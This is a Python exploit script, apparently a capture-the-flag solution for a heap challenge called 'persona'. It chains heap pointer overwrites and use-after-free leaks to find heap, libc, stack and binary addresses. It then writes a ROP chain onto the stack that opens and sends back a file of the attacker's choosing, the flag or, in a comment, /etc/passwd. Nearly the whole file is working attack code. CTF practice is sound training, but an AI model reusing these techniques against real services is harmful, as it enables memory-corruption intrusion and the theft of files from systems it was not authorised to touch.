#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './persona'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'persona.ctf.defenit.kr', 'port':9999})
env.select()

#==========

binf = ELF(bin_file)
offset_start            = 0xe60

libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

global_key = 4296 # randint(1000, 9999)

#==========

def setting(conn, **kwargs):
    ps = Persona(conn)

    ps.view()
    ps.view()
    ps.create('a'*8, 1, 'a'*8)
    ps.share(0, global_key)

def leak_heap_base(conn, **kwargs):
    ps = Persona(conn)

    ps.view()
    ps.view()
    ps.meet(global_key)
    ps.meet(global_key)

    ps.delete(0)
    _, _, bio = ps.view(0)

    addr_heap_base = u(bio) - 0x2e0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    return addr_heap_base

def attack(conn, **kwargs):
    ps = Persona(conn)

    addr_heap_base = kwargs['heap']

    ps.create('b'*8, 1, 'B'*8)  # 0
    ps.meet(global_key)         # 1
    ps.meet(global_key)         # 2

    ps.edit(1, 'x', 1, (p32(0)+b'heap1').ljust(0x20, b'\x00') + p64(addr_heap_base + 0x358))
    ps.edit(0, 'heap1', 0, p64(0x421) + b'\x00'*0x28)
    ps.edit(1, 'y', 1, (p32(0)+b'heap2').ljust(0x20, b'\x00') + p64(addr_heap_base + 0x770))
    ps.edit(0, 'heap2', 0, (p64(0) + p64(0x11))*2)
    ps.delete(2)

    ps.edit(1, 'z', 1, (p32(0)+b'heap1').ljust(0x20, b'\x00') + p64(addr_heap_base + 0x410))
    _, _, bio = ps.view(0)

    addr_libc_mainarena = u(bio) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_environ   = libc.symbols['environ']

    ps.edit(1, 'STACK', 1, (p32(0)+b'BASE').ljust(0x20, b'\x00') + p64(addr_libc_environ))
    _, _, bio = ps.view(0)

    addr_stack = u(bio)
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    ps.edit(1, 'STACK', 2, (p32(0)+b'BASE').ljust(0x20, b'\x00') + p64(addr_stack - 0x38))
    _, _, bio = ps.view(0)

    addr_start = u(bio) - 0x2a
    binf.address = addr_start - offset_start
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))
    addr_bss        = binf.sep_section['.bss']
    addr_buf        = addr_bss + 0x80
    addr_sends      = binf.address + 0x1142
    addr_recvs      = binf.address + 0x1190

    rop = ROP(binf)
    rop.call(addr_recvs, [addr_stack-0x200+0x30, 0x800])

    exploit  = p64(rop.ret.address)*6
    exploit += bytes(rop)
    ps.edit(1, 'STACK', 2, (p32(0)+b'BASE').ljust(0x20, b'\x00') + p64(addr_stack - 0x220))
    ps.edit(0, 'ROP', 3, exploit)

    rop = ROP(libc)
    rop.call(addr_recvs, [addr_buf, 0x20])
    rop.close(0)
    rop.open(addr_buf, 0)
    rop.read(0, addr_buf, 0x100)
    rop.call(addr_sends, [addr_buf, 0x100])

    exploit  = p64(rop.ret.address)*0x10
    exploit += bytes(rop)
    sleep(0.2)
    conn.send(exploit)

    sleep(0.2)
    conn.send(b'/home/persona/flag')
    # conn.send(b'/etc/passwd')

'''
def detect_bin_base(conn, **kwargs):
    ps = Persona(conn)

    addr_heap_base = kwargs['heap']
    x = kwargs['rep_argl'][0]

    ps.create('b'*8, 1, 'B'*8)  # 0
    ps.meet(global_key)         # 1

    addr = addr_heap_base - (0x204 + x)*0x1000
    ps.edit(1, 'BIN', x, (p32(0)+b'BASE').ljust(0x20, b'\x00') + p64(addr))

    _, _, bio = ps.view(0)
    if not bio.startswith(b'\x7fELF'):
        raise

    binf.address = addr_heap_base - (0x204000 + 0x1000*x)
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))

def attack(conn, **kwargs):
    ps = Persona(conn)

    addr_heap_base = kwargs['heap']

    ps.create('b'*8, 1, 'B'*8)
    ps.meet(global_key)

    addr_bss        = binf.sep_section['.bss']
    addr_sends      = binf.address + 0x1142
    addr_recvs      = binf.address + 0x1190
    addr_got_atoi   = binf.got['atoi']
    ps.edit(1, 'LIBC', 0, (p32(0)+b'atoi').ljust(0x20, b'\x00') + p64(addr_got_atoi))

    _, _, bio = ps.view(0)
    addr_libc_atoi = u(bio)
    libc.address = addr_libc_atoi - offset_libc_atoi
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_environ   = libc.symbols['environ']

    ps.edit(1, 'STACK', 1, (p32(0)+b'BASE').ljust(0x20, b'\x00') + p64(addr_libc_environ))
    _, _, bio = ps.view(0)
    addr_stack = u(bio)
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    ps.edit(1, 'STACK', 2, (p32(0)+b'BASE').ljust(0x20, b'\x00') + p64(addr_stack - 0x220))

    rop = ROP(binf)
    rop.call(addr_recvs, [addr_stack-0x200+0x30, 0x800])

    exploit  = p64(rop.ret.address)*6
    exploit += bytes(rop)

    ps.edit(0, 'ROP', 3, exploit)

    rop = ROP(libc)
    rop.call(addr_recvs, [addr_bss, 0x20])
    rop.close(0)
    rop.open(addr_bss, 0)
    rop.read(0, addr_bss, 0x100)
    rop.call(addr_sends, [addr_bss, 0x100])

    exploit  = p64(rop.ret.address)*0x10
    exploit += bytes(rop)
    conn.send(exploit)

    conn.send(b'/home/persona/flag')
'''

class Persona:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

        if env.check('remote'):
            self.solve_pow()

    def solve_pow(self):
        s = self.recvuntil('\n').decode()
        chal = re.findall(r'"([0-9a-f]+)"', s)[0]
        info('challenge : {}'.format(chal))

        i = 0
        with log.progress('Progress ') as p:
            while True:
                if i%10000 == 0:
                    p.status('testing {}'.format(i))

                m = hashlib.sha256()
                m.update(str(i).encode())
                if m.hexdigest()[-6:] == chal:
                    info('pow found : {}'.format(i))
                    break
                i += 1
        self.sendlineafter('str : ', str(i))

    def create(self, nick, age, bio):
        self.sendlineafter('>> ', 'C')
        self.sendlineafter('Nickname : ', nick)
        self.sendlineafter('Age : ', str(age))
        self.sendlineafter('BIO : ', bio)

    def edit(self, idx, nick, age, bio):
        self.sendlineafter('>> ', 'E')
        self.sendlineafter('Index : ', str(idx))
        self.sendlineafter('Nickname : ', nick)
        self.sendlineafter('Age : ', str(age))
        self.sendlineafter('Bio : ', bio)

    def view(self, idx=None):
        self.sendlineafter('>> ', 'V')

        if idx is not None:
            self.sendlineafter('Index : ', str(idx))
            self.recvuntil(' : ')
            nick = self.recvuntil('\nAge', drop=True)
            self.recvuntil(' : ')
            age = int(self.recvuntil('\nBio', drop=True))
            self.recvuntil(' : ')
            bio = self.recvuntil('\n\n==', drop=True)
            return nick, age, bio

    def delete(self, idx):
        self.sendlineafter('>> ', 'D')
        self.sendlineafter('Index : ', str(idx))

    def share(self, idx, key):
        self.sendlineafter('>> ', 'S')
        self.sendlineafter('Index : ', str(idx))
        self.sendlineafter('Key : ', str(key))

    def meet(self, key, ipt=True):
        self.sendlineafter('>> ', 'M')
        self.sendlineafter('Key : ', str(key))
        self.recvuntil(' : ')
        nick = self.recvuntil('\nImport', drop=True)
        self.sendlineafter('(Y/N) : ', 'y' if ipt else 'n')
        return nick

    def quit(self):
        self.sendlineafter('>> ', 'Q')

#==========

def main():
    '''
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(setting)

    comn = Communicate(env.mode, **env.target)
    comn.connect()
    heap = comn.run(leak_heap_base)
    '''
    heap = 0x55b557ef4000

    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack, heap=heap)

    '''
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.quiet = True
    comn.repeat(detect_bin_base, True, range(0, 0x1000), heap=heap)
    '''

    comn.interactive()

if __name__=='__main__':
    main()

#==========
